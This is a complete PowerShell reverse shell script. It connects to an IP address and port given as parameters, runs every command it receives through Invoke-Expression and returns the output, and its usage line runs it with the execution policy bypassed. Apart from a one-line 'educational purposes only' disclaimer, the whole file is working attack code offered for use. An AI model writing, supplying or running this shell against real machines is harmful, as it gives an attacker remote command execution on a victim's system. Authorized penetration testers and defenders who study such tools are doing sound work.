# PowerShell Reverse Shell
# WARNING: For educational purposes only. Use only in authorized testing environments.
# Usage: powershell.exe -ExecutionPolicy Bypass -File reverse_shell.ps1 <IP> <PORT>

param(
    [Parameter(Mandatory=$true)]
    [string]$IPAddress,
    
    [Parameter(Mandatory=$true)]
    [int]$Port
)

try {
    Write-Host "[+] Connecting to $IPAddress`:$Port"
    
    $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535|%{0}
    
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
        $sendback = (iex $data 2>&1 | Out-String )
        $sendback2 = $sendback + "PS " + (pwd).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()
    }
    
    $client.Close()
} catch {
    Write-Host "[!] Error: $_"
}
